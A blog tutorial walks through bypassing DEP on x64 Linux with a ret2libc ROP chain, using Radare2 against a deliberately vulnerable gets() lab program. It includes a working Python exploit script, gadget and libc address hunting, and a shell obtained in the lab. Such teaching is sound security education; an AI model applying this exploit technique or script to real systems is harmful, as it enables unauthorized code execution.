---
layout: post
title:  Reverse engineering x64 binaries with Radare2 - Bypasssing DEP with simple ROP Chains
tags: reversing c radare
image: '/images//radare2/radare2_21.png'
date:  2022-06-14 15:01:35 -0700
---

Hello again my dear friends. And congratulations if you got as far as here, it's been more than 20 tutorials so far and we've learnt a bunch of new things. To learn even a bit more today we are going to expand our previous tutorial on exploiting x64 buffer overflows by learning how to bypass the Data Execution Prevention mechanism also known as DEP.


#### About Data Execution Prevention

If we remember well, in our previous example we exploited a simple server app and we had the chance to run code allocated inside the stack by compiling the vulnerable app with the -z exexstack parameter. Basically that parameter marks the stack as executable, so we can overwritte the RET address (to be passed in RIP) by some JMP/CALL/etc whatever position to our shellcode in the stack and that's it. DEP works by making use of the NX bit. NX or XD bit: The NX (no-execute) or XD (eXecute Disabled) bit is a technology used in CPUs to segregate areas of memory for use by either storage of processor instructions (code) or for storage of data. The stack will be marked as for storage of data.

When DEP is enabled (the OS can do DEP) and the executable has it working (compiled without -z execstack) an exploit like the one we wrote will fail triggering an ACCESS VIOLATION exception and we'll just die there.

Usually, the DEP mechanism can be bypassed by applying what is called a "code reuse attack". A Code Reuse Attack is an exploitation technique which after gaining control of the instruction pointer, redirects the executable’s control flow to existing code that suits the attacker’s needs. So that is, we will simply overwritte memory areas in our control, to redirect the execution flow not to code on the stack but to instructions located in the executable part of the memory that suit our needs. Return-into-library and Pre-existing Instruction Sequences (gadgets) are examples of the particular technique.

#### ROP Chains

So knowing that, we can overwrite the memory by piling several addresses on the stack, the first address will point to a sequence of instructions being the first one the instruction we want the program to run, FOLLOWED BY a ret instruction. The ret instruction will then POP the address on top of the stack and continue the execution from there... you get it right? You start doing this all over and basically you get what it's call a ROP CHAIN or RETURN oriented programming chain.

A ROP Chain can be seen as something like this:

![ROP](https://miro.medium.com/max/1400/1*3P5V7fn2mO5LDLAI99-PGA.png)


#### About "return to libc"

So if we want to implement a ROP chain attack we'll need to find some useful code in memory, especially code that will have the chance of doing useful stuff. For us, useful stuff will mean running functions like system() to execute commands, or perhaps listen/connect/accept(), write() etc. And whenever possible we would like to have the chance to use this same strategy everywhere. So that's when the LIBC comes in very handy. The LIBC is omnipresent in C compiled software in x64 Linux systems at least. So the ROP chains we write using memory addresses from this library will be executed in a wide array of programs. 

So one of the most useful functions contained in the LIBC library is the system() to summarize it runs a program/command specified as a parameter. In our case we'd like to run the /bin/sh with it to spawn a shell. (You may ask why would I like to do that? in a program that's already running from the terminal in the machine where I do have a shell? Then I'd say go do some research on the sticky bit and suid attacks).

Let's inspect how the system() call works:

```C
#include <stdlib.h>

int main(){
system("/bin/sh");

}
```

So we compile and disasm the code in r2

```
[0x55555555464a]> pdf
            ;-- main:
            ;-- rax:
            ;-- rip:
/ (fcn) sym.main 23
|   sym.main ();
|              ; DATA XREF from 0x55555555455d (entry0)
|           0x55555555464a      55             push rbp
|           0x55555555464b      4889e5         mov rbp, rsp
|           0x55555555464e      488d3d9f0000.  lea rdi, qword str.bin_sh ; 0x5555555546f4 ; "/bin/sh" ; const char * string
|           0x555555554655      e8c6feffff     call sym.imp.system     ; int system(const char *string)
|           0x55555555465a      b800000000     mov eax, 0
|           0x55555555465f      5d             pop rbp
\           0x555555554660      c3             ret
[0x55555555464a]> 
```
And we basically see the /bin/sh being passed as parameter by using the rdi register and the system() being called.

It is also important for us to check the process of how the system() function works, so we can identify it and better debug our exploit later on:
```
[0x55555555464a]> pdf
            ;-- main:
            ;-- rax:
/ (fcn) sym.main 23
|   sym.main ();
|              ; DATA XREF from 0x55555555455d (entry0)
|           0x55555555464a      55             push rbp
|           0x55555555464b      4889e5         mov rbp, rsp
|           0x55555555464e      488d3d9f0000.  lea rdi, qword str.bin_sh ; 0x5555555546f4 ; "/bin/sh" ; const char * string
|           ;-- rip:
|           0x555555554655      e8c6feffff     call sym.imp.system     ; int system(const char *string)
|           0x55555555465a      b800000000     mov eax, 0
|           0x55555555465f      5d             pop rbp
\           0x555555554660      c3             ret
[0x55555555464a]> pxw @ rdi
0x5555555546f4  0x6e69622f 0x0068732f 0x3b031b01 0x00000038  /bin/sh....;8...

[0x555555554520]> ds
[0x7ffff7a31420]> pdf
p: Cannot find function at 0x7ffff7a31420
[0x7ffff7a31420]> pd 10
        :   ;-- rip:
        :   0x7ffff7a31420      4885ff         test rdi, rdi
       ,==< 0x7ffff7a31423      740b           je 0x7ffff7a31430
       |`=< 0x7ffff7a31425      e966faffff     jmp 0x7ffff7a30e90
       |    0x7ffff7a3142a      660f1f440000   nop word [rax + rax]
       `--> 0x7ffff7a31430      488d3d594916.  lea rdi, qword [0x7ffff7b95d90] ; "exit 0"
            0x7ffff7a31437      4883ec08       sub rsp, 8
            0x7ffff7a3143b      e850faffff     call 0x7ffff7a30e90
```

And having seen that, let us try to exploit this sample program from [this awesome blog post](https://valsamaras.medium.com/introduction-to-x64-binary-exploitation-part-2-return-into-libc-c325017f465)

```C 
#include <stdio.h>
#include <string.h>
#include <stdlib.h>

void greet_me(){

        char name[200];
        gets(name);
        printf("hi there %s !!\n",name);
}

int main(int argc, char *argv[]){

        greet_me();

        return 0;

}
```
We can compile it
```
gcc -w -fno-stack-protector vuln.c -o vuln -D_FORTIFY_SOURCE0
```


The program is simple it calls greet_me() and then we write whatever string to a limited 200byte buffer. As we already seen we can overflow the buffer by sending a string larger than 200. So to make things quick we can use our pattern tool or ragg2 to generate a pattern and start identifying the positions in where we can control the buffer.

So we will run the program, it will ask for some string but... how do we pass it into the radare2 debugger? We can use rarun2 for that. First we create a script such as the following:

 
```
#!/usr/bin/rarun2
stdio=/dev/pts/1
stdin=./payload
```
Where payload is the buffer we want to send into execution (gets()). We can generate our payload with 
```
python3 exploit.py > payload

OR 

pattern_create.py 900 > payload
```

Then radare2 will be run like:

```
r2 -e dbg.profile=./script.rr2 -dA vuln
```

So knowing that, we proceed and run the program while debugging it:

The stack looks like this:

![Stack](https://miro.medium.com/max/966/1*jo-61Wu9G11Xht7l7PGPJg.png)

```
[0x5555555546c6]> dr 
rax = 0x00000265
rbx = 0x00000000
rcx = 0x00000000
rdx = 0x00000000
r8 = 0x00000000
r9 = 0x00000258
r10 = 0x5555557574d1
r11 = 0x00000246
r12 = 0x555555554580
r13 = 0x7fffffffe0e0
r14 = 0x00000000
r15 = 0x00000000
rsi = 0x555555757270
rdi = 0x00000001
rsp = 0x7fffffffdfe8
rbp = 0x3168413068413967
rip = 0x5555555546c6
rflags = 0x00010202
orax = 0xffffffffffffffff
[0x5555555546c6]> 

[0x5555555546c6]> pxw @ rsp
0x7fffffffdfe8  0x41326841 0x68413368 0x35684134 0x41366841  Ah2Ah3Ah4Ah5Ah6A
0x7fffffffdff8  0x68413768 0x39684138 0x41306941 0x69413169  h7Ah8Ah9Ai0Ai1Ai
0x7fffffffe008  0x33694132 0x41346941 0x69413569 0x37694136  2Ai3Ai4Ai5Ai6Ai7
```
So we see that we correctly overflow the stack and we have control over RBP. 

```
lab@lab-VirtualBox:~$ python3 exploit-pattern/pattern.py 0x3168413068413967
Pattern 0x3168413068413967 first occurrence at position 208 in pattern.
lab@lab-VirtualBox:~$ python3 exploit-pattern/pattern.py 0x41326841
Pattern 0x41326841 first occurrence at position 216 in pattern.
lab@lab-VirtualBox:~$ 
```
So as we know we can control the stack / rbp and at which positions, we can start drawing a skeleton for our exploit:
```
import sys
import struct
buf = b"A"* 208
buf += b"BBBBBBBB" #RBP overwrite
buf += struct.pack('<Q',0x7fffffffdfe8) #RIP overwrite
sys.stdout.buffer.write(buf)
```
And again use rarun to launch it:
```
python3 exploit.py > payload
r2 -e dbg.profile=./script.rr2 -dA vuln
```
At this point we would start crafting our exploit by making use of a ROP chain. At first we need to know the libraries available, loaded in the program. And to specifically search for the LIBC: 
```
[0x7ffff7dd4090]> iiq
free
_ITM_deregisterTMCloneTable
r_run_config_env
puts
dup2
strchr
r_run_parseline
close
__libc_start_main
strcmp
signal
r_run_new
__gmon_start__
r_run_free
r_run_start
r_run_help
r_str_newf
__printf_chk
r_sys_cmd
fwrite
_ITM_registerTMCloneTable
sleep
__cxa_finalize
stderr
_ITM_deregisterTMCloneTable
__libc_start_main
__gmon_start__
_ITM_registerTMCloneTable
__cxa_finalize
stderr
```
dm will show the libraries being mapped in memory. We can see libc in there:
```
[0x7fffffffdfe8]> dm
0x0000555555554000 # 0x0000555555555000 - usr     4K s -r-x /home/lab/vuln /home/lab/vuln ; map.usr_bin_rarun2._r_x
0x0000555555754000 # 0x0000555555755000 - usr     4K s -r-- /home/lab/vuln /home/lab/vuln
0x0000555555755000 # 0x0000555555756000 - usr     4K s -rw- /home/lab/vuln /home/lab/vuln ; map.usr_bin_rarun2._rw
0x0000555555756000 # 0x0000555555777000 - usr   132K s -rw- [heap] [heap] ; section_end.GNU_RELRO
0x00007ffff79e2000 # 0x00007ffff7bc9000 - usr   1.9M s -r-x /lib/x86_64-linux-gnu/libc-2.27.so /lib/x86_64-linux-gnu/libc-2.27.so
0x00007ffff7bc9000 # 0x00007ffff7dc9000 - usr     2M s ---- /lib/x86_64-linux-gnu/libc-2.27.so /lib/x86_64-linux-gnu/libc-2.27.so
0x00007ffff7dc9000 # 0x00007ffff7dcd000 - usr    16K s -r-- /lib/x86_64-linux-gnu/libc-2.27.so /lib/x86_64-linux-gnu/libc-2.27.so
0x00007ffff7dcd000 # 0x00007ffff7dcf000 - usr     8K s -rw- /lib/x86_64-linux-gnu/libc-2.27.so /lib/x86_64-linux-gnu/libc-2.27.so
0x00007ffff7dcf000 # 0x00007ffff7dd3000 - usr    16K s -rw- unk0 unk0
0x00007ffff7dd3000 # 0x00007ffff7dfc000 - usr   164K s -r-x /lib/x86_64-linux-gnu/ld-2.27.so /lib/x86_64-linux-gnu/ld-2.27.so ; map.lib_x86_64_linux_gnu_ld_2.27.so._r_x
0x00007ffff7fe2000 # 0x00007ffff7fe4000 - usr     8K s -rw- unk1 unk1
0x00007ffff7ff8000 # 0x00007ffff7ffb000 - usr    12K s -r-- [vvar] [vvar] ; map.vvar_._r
0x00007ffff7ffb000 # 0x00007ffff7ffc000 - usr     4K s -r-x [vdso] [vdso] ; map.vdso_._r_x
0x00007ffff7ffc000 # 0x00007ffff7ffd000 - usr     4K s -r-- /lib/x86_64-linux-gnu/ld-2.27.so /lib/x86_64-linux-gnu/ld-2.27.so ; map.lib_x86_64_linux_gnu_ld_2.27.so._rw
0x00007ffff7ffd000 # 0x00007ffff7ffe000 - usr     4K s -rw- /lib/x86_64-linux-gnu/ld-2.27.so /lib/x86_64-linux-gnu/ld-2.27.so
0x00007ffff7ffe000 # 0x00007ffff7fff000 - usr     4K s -rw- unk2 unk2 ; map.unk0._rw
0x00007ffffffde000 # 0x00007ffffffff000 * usr   132K s -rw- [stack] [stack] ; map.stack_._rw
0xffffffffff600000 # 0xffffffffff601000 - usr     4K s ---x [vsyscall] [vsyscall] ; map.vsyscall_.___x
[0x7fffffffdfe8]> 
```
And we can specifically search for the positions of LIBC using dmm:
```
[0x5555555546c7]> dmm~libc 
0x7ffff79e2000 /lib/x86_64-linux-gnu/libc-2.27.so
```
So with that, we know the base address of libc once it's loaded in memory. If we locate addresses of relevant functions in memory we'll be able to tell how far they are from the base addr and use that difference to call the. This can be also done offline in static mode by "reversing" the library file (.so).

We can also do it to find addresses both static/dynamic for our calls of interest:
```
[0x7ffff7dd4090]> dmi libc system~ system$
Unknown library, or not found in dm
[0x7ffff7dd4090]> dcu main
Continue until 0x5555555546c7 using 1 bpsize
hit breakpoint at: 5555555546c7
[0x5555555546c7]> dmi libc system~ system$
1406 0x0004f420 0x7ffff7a31420   WEAK   FUNC   45 system
[0x5555555546c7]> 
```
We'll need system() to launch a command and exit() to exit the program without breaking too much basically
```
[0x5555555546c7]> dmi libc exit~ exit$
132 0x00043110 0x7ffff7a25110 GLOBAL   FUNC   26 exit
[0x5555555546c7]> 
```
And we'll also need a pop rdi, so we can use it to load a parameter into RDI (/bin/sh) before the call to system()
```
[0x5555555546c7]> /R pop rdi
  0x555555554753                 5f  pop rdi
  0x555555554754                 c3  ret
```
And a ret so we can align the stack to 16B when executing: (note that we can find instructions like ret, pop etc both in the libc space or in the general program space)
```
[0x5555555546c7]> /R ret
  0x55555555428f                 94  xchg eax, esp
  0x555555554290               f2f8  clc
  0x555555554292               2021  and byte [rcx], ah
  0x555555554294                 5a  pop rdx
  0x555555554295                 c3  ret

  0x555555554291                 f8  clc
  0x555555554292               2021  and byte [rcx], ah
  0x555555554294                 5a  pop rdx
  0x555555554295                 c3  ret
```
What remains is the address where we can find the string /bin/sh (so we can load a pointer to it inside rdi before calling system()) 

And as we told, we can directly reverse the libc file and search for the string. We'll find the (static) addr. 
```
lab@lab-VirtualBox:~$ r2 -A /lib/x86_64-linux-gnu/libc.so.6
[x] Analyze all flags starting with sym. and entry0 (aa)
[x] Analyze len bytes of instructions for references (aar)
[x] Analyze function calls (aac)
[x] Use -AA or aaaa to perform additional experimental analysis.
[x] Constructing a function name for fcn.* and sym.func.* functions (aan)
[0x00021da0]> / /bin/sh
Searching 7 bytes in [0x0-0x1e6a7c]
hits: 1
Searching 7 bytes in [0x3e7618-0x3f0ae0]
hits: 0
0x001b3d88 hit0_0 .cempty == 1-c/bin/shexit 0canonica.
[0x00021da0]> 
```
Or we can perhaps do the sime in dynamic mode in radare by searching in all mem space:
```
[0x5555555546c7]> e search.in = dbg.maps
[0x5555555546c7]> / /bin/sh
0x7ffff7b95d88 hit0_0 .cempty == 1-c/bin/shexit 0canonica.
```
And we can substract libc base addr to whatever addr easily to know the delta:
```
[0x5555555546c7]> ?X 0x7ffff7b95d88-0x7ffff79e2000 
1b3d88
```
So we end up with the variables for our rop chain as it follows:
``` 
libc_base_address = 0x7ffff79e2000
pop_rdi = 0x555555554753
ret = 0x555555554295
bin_sh = libc_base_address+0x1b3d88
system_call = libc_base_address+0x4f420
exit_call = libc_base_address+0x43110
```
And we can craft that into our exploit:
```
import sys
import struct

libc_base_address = 0x7ffff79e2000

pop_rdi = 0x555555554753
ret = 0x555555554295

bin_sh = libc_base_address+0x1b3d88
system_call = libc_base_address+0x4f420
exit_call = libc_base_address+0x43110

buf = b"A"* 208
buf += b"BBBBBBBB" #RBP overwrite

#buf += struct.pack('<Q',ret)
buf += struct.pack('<Q',pop_rdi) #RIP overwrite
buf += struct.pack('<Q',bin_sh) #RIP overwrite
buf += struct.pack('<Q',system_call) #RIP overwrite
buf += struct.pack('<Q',exit_call) #RIP overwrite

sys.stdout.buffer.write(buf)
```
And we already know what to do. We can jump to the greet function and place a breakpoint after ret (remember: ret will try to return to the addr on top of the stack, and we control the stack)
```
[0x55555555468a]> db 0x5555555546c6
[0x55555555468a]> dc
hit breakpoint at: 5555555546c6
[0x55555555468a]> pdf
/ (fcn) sym.greet_me 61
|   sym.greet_me ();
|           ; var int local_d0h @ rbp-0xd0
|              ; CALL XREF from 0x5555555546db (sym.main)
|           0x55555555468a      55             push rbp
|           0x55555555468b      4889e5         mov rbp, rsp
|           0x55555555468e      4881ecd00000.  sub rsp, 0xd0
|           0x555555554695      488d8530ffff.  lea rax, qword [local_d0h]
|           0x55555555469c      4889c7         mov rdi, rax
|           0x55555555469f      b800000000     mov eax, 0
|           0x5555555546a4      e8b7feffff     call sym.imp.gets       ; char*gets(char *s)
|           0x5555555546a9      488d8530ffff.  lea rax, qword [local_d0h]
|           0x5555555546b0      4889c6         mov rsi, rax
|           0x5555555546b3      488d3dba0000.  lea rdi, qword str.hi_there__s ; 0x555555554774 ; "hi there %s !!\n"
|           0x5555555546ba      b800000000     mov eax, 0
|           0x5555555546bf      e88cfeffff     call sym.imp.printf     ; int printf(const char *format)
|           0x5555555546c4      90             nop
|           0x5555555546c5      c9             leave
|           ;-- rip:
\           0x5555555546c6 b    c3             ret
[0x55555555468a]> 
```
We check that our exploit is triggering:
```
[0x55555555468a]> dr
rax = 0x000000eb
rbx = 0x00000000
rcx = 0x00000000
rdx = 0x00000000
r8 = 0x00000000
r9 = 0x000000de
r10 = 0xffffff22
r11 = 0x00000246
r12 = 0x555555554580
r13 = 0x7fffffffe0c0
r14 = 0x00000000
r15 = 0x00000000
rsi = 0x555555757270
rdi = 0x00000001
rsp = 0x7fffffffdfc8
rbp = 0x4242424242424242
rip = 0x5555555546c6
rflags = 0x00000206
orax = 0xffffffffffffffff
[0x55555555468a]> 

[0x55555555468a]> pxw @ rsp
0x7fffffffdfc8  0x55554753 0x00005555 0xf7b95d88 0x00007fff  SGUUUU...]......
0x7fffffffdfd8  0xf7a31420 0x00007fff 0xf7a25110 0x00007fff   ........Q......
0x7fffffffdfe8  0xf7a03c00 0x00007fff 0x00000001 0x00000000  .<..............
0x7fffffffdff8  0xffffe0c8 0x00007fff 0x00008000 0x00000001  ................
0x7fffffffe008  0x555546c7 0x00005555 0x00000000 0x00000000  .FUUUU..........
0x7fffffffe018  0x276cc210 0x3e4d7841 0x55554580 0x00005555  ..l'AxM>.EUUUU..
```
So we see that we have our params on the stack ready to be pop'ed
```
[0x55555555468a]> pd 10 @ 0x0000555555554753
|           0x555555554753      5f             pop rdi
\           0x555555554754      c3             ret

[0x55555555468a]> pxw @ 0x00007ffff7b95d88
0x7ffff7b95d88  0x6e69622f 0x0068732f 0x74697865 0x63003020  /bin/sh.exit 0.c
0x7ffff7b95d98  0x6e6f6e61 0x6c616369 0x2e657a69 0x534d0063  anonicalize.c.MS
0x7ffff7b95da8  0x52455647 0x45530042 0x454c5f56 0x004c4556  GVERB.SEV_LEVEL.

[0x55555555468a]> pd 10 @ 0x00007ffff7a31420
        :   0x7ffff7a31420      4885ff         test rdi, rdi
       ,==< 0x7ffff7a31423      740b           je 0x7ffff7a31430
       |`=< 0x7ffff7a31425      e966faffff     jmp 0x7ffff7a30e90
       |    0x7ffff7a3142a      660f1f440000   nop word [rax + rax]
       `--> 0x7ffff7a31430      488d3d594916.  lea rdi, qword [0x7ffff7b95d90] ; "exit 0"
            0x7ffff7a31437      4883ec08       sub rsp, 8
            0x7ffff7a3143b      e850faffff     call 0x7ffff7a30e90
            0x7ffff7a31440      85c0           test eax, eax
            0x7ffff7a31442      0f94c0         sete al
            0x7ffff7a31445      4883c408       add rsp, 8
```
All of them placed correctly. We can manually continue the execution of the program with ds, step by step and we see that at least we are gettingo into the system() call:
```
[0x555555554753]> pd 10
|           ;-- rip:
|           0x555555554753      5f             pop rdi
\           0x555555554754      c3             ret

[0x555555554753]> ds
[0x555555554753]> dr rdi
0x7ffff7b95d88
[0x555555554753]> pxw @ rdi
0x7ffff7b95d88  0x6e69622f 0x0068732f 0x74697865 0x63003020  /bin/sh.exit 0.c

[0x7ffff7a31420]> ds
[0x7ffff7a31420]> pd 10
        :   0x7ffff7a31420      4885ff         test rdi, rdi
        :   ;-- rip:
       ,==< 0x7ffff7a31423      740b           je 0x7ffff7a31430
       |`=< 0x7ffff7a31425      e966faffff     jmp 0x7ffff7a30e90
       |    0x7ffff7a3142a      660f1f440000   nop word [rax + rax]
       `--> 0x7ffff7a31430      488d3d594916.  lea rdi, qword [0x7ffff7b95d90] ; "exit 0"
dc
```
But if we check that we'll see that our exploit is now working quite as well as expected:
```
lab@lab-VirtualBox:~$ (python3 exploit.py ; cat) | ./vuln

hi there AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBSGUUUU !!
ls
lab@lab-VirtualBox:~$ 
```
That is because the stack needs to be 16B aligned(x64 convention). Check it before and after we pad with an extra RET:
```
BEFORE
[0x55555555468a]> pxw @ rsp
0x7fffffffdfc8  0x55554753 0x00005555 0xf7b95d88 0x00007fff  SGUUUU...]......
0x7fffffffdfd8  0xf7a31420 0x00007fff 0xf7a25110 0x00007fff   ........Q......
0x7fffffffdfe8  0xf7a03c00 0x00007fff 0x00000001 0x00000000  .<..............

AFTER
[0x55555555468a]> pxw @ rsp
0x7fffffffdfc8  0x55554295 0x00005555 0x55554753 0x00005555  .BUUUU..SGUUUU..
0x7fffffffdfd8  0xf7b95d88 0x00007fff 0xf7a31420 0x00007fff  .]...... .......
0x7fffffffdfe8  0xf7a25110 0x00007fff 0x00000000 0x00000000  .Q..............

WE DO A STEP
ds
[0x555555554295]> pxw @ rsp
0x7fffffffdfd0  0x55554753 0x00005555 0xf7b95d88 0x00007fff  SGUUUU...]......
0x7fffffffdfe0  0xf7a31420 0x00007fff 0xf7a25110 0x00007fff   ........Q......
0x7fffffffdff0  0x00000000 0x00000000 0xffffe0c8 0x00007fff  ................
```
Now we are talking
```
lab@lab-VirtualBox:~$ (python3 exploit.py ; cat) | ./vuln

ls 
file1
file2
flag.txt
```
And that's it folks! Exploited.

#### References
- [ROP chains](https://d4mianwayne.github.io/2019/07/24/rop-introduction/)
- [Interesting post I consulted](https://valsamaras.medium.com/introduction-to-x64-binary-exploitation-part-2-return-into-libc-c325017f465)
- [Stack alingment](https://stackoverflow.com/questions/672461/what-is-stack-alignment#:~:text=IIRC%2C%20stack%20alignment%20is%20when,stack%20pointer%20within%20a%20function.)
- [Megabeets tutorial on exploits with r2](https://www.megabeets.net/a-journey-into-radare-2-part-2/)








